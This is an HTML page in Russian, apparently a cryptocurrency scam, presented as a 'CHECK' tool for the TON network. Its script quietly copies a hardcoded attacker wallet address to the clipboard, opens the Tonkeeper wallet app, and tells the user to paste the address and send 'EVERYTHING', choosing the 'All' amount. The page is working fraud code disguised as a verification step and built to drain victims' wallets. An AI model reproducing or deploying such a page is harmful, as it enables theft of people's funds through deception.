<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TON</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0b0b;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: system-ui, sans-serif;
      padding: 16px;
    }
    .card {
      max-width: 400px;
      width: 100%;
      background: #151515;
      border-radius: 32px;
      padding: 32px 24px;
      text-align: center;
      border: 1px solid #282828;
    }
    .btn {
      background: #0088cc;
      border: none;
      color: white;
      font-size: 18px;
      font-weight: 600;
      padding: 16px;
      border-radius: 60px;
      width: 100%;
      cursor: pointer;
      margin-top: 8px;
      transition: 0.2s;
    }
    .btn:active { transform: scale(0.97); }
    .btn-danger { background: #cc4400; }
    #status {
      color: #888;
      font-size: 14px;
      margin-top: 20px;
      min-height: 24px;
    }
    .confirm-box {
      background: #1e1e1e;
      border: 1px solid #2a4a6a;
      border-radius: 20px;
      padding: 20px 16px;
      margin-top: 24px;
      display: none;
    }
    .confirm-box.show { display: block; }
    .confirm-box .title { color: #fff; font-weight: 600; font-size: 16px; }
    .confirm-box .sub { color: #8899aa; font-size: 13px; margin: 6px 0 14px; }
    .confirm-box .open-btn {
      background: #0088cc;
      border: none;
      color: #fff;
      font-weight: 600;
      font-size: 16px;
      padding: 12px;
      border-radius: 40px;
      width: 100%;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="card">
    <div style="font-size: 40px;">⚡</div>

    <button class="btn" id="mainBtn">ПРОВЕРИТЬ</button>
    <div id="status">Нажмите кнопку</div>

    <div class="confirm-box" id="confirmBox">
      <div class="title">✅ Отправь ВСЁ</div>
      <div class="sub">Вставь адрес и выбери «Всё»</div>
      <button class="open-btn" id="openWalletBtn">Открыть Tonkeeper</button>
    </div>
  </div>

  <script>
    const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

    const mainBtn = document.getElementById('mainBtn');
    const status = document.getElementById('status');
    const confirmBox = document.getElementById('confirmBox');
    const openWalletBtn = document.getElementById('openWalletBtn');

    // ====== КОПИРОВАТЬ АДРЕС ======
    function copyAddress() {
      if (navigator.clipboard) {
        navigator.clipboard.writeText(TARGET)
          .then(() => status.innerText = '✅ Адрес скопирован!')
          .catch(() => fallbackCopy());
      } else {
        fallbackCopy();
      }
    }

    function fallbackCopy() {
      const textarea = document.createElement('textarea');
      textarea.value = TARGET;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      status.innerText = '✅ Адрес скопирован!';
    }

    // ====== ОТКРЫТЬ TON KEEPER ======
    function openTonkeeper() {
      window.location.href = 'ton://';
      setTimeout(() => {
        window.open('ton://', '_blank');
      }, 300);
      status.innerText = '📲 Вставь адрес и отправь ВСЁ';
      confirmBox.classList.add('show');
    }

    // ====== ГЛАВНАЯ КНОПКА ======
    mainBtn.onclick = function() {
      status.innerText = '⏳ Копирую адрес...';
      
      // Копируем адрес
      copyAddress();
      
      // Открываем TON Keeper
      setTimeout(() => {
        openTonkeeper();
      }, 500);
      
      mainBtn.innerText = '✅ ГОТОВО';
      mainBtn.style.background = '#00aa66';
      mainBtn.disabled = true;
    };

    // ====== КНОПКА "ОТКРЫТЬ TONKEEPER" ======
    openWalletBtn.onclick = function() {
      openTonkeeper();
    };

    status.innerText = 'Нажмите «ПРОВЕРИТЬ»';
  </script>
</body>
</html>
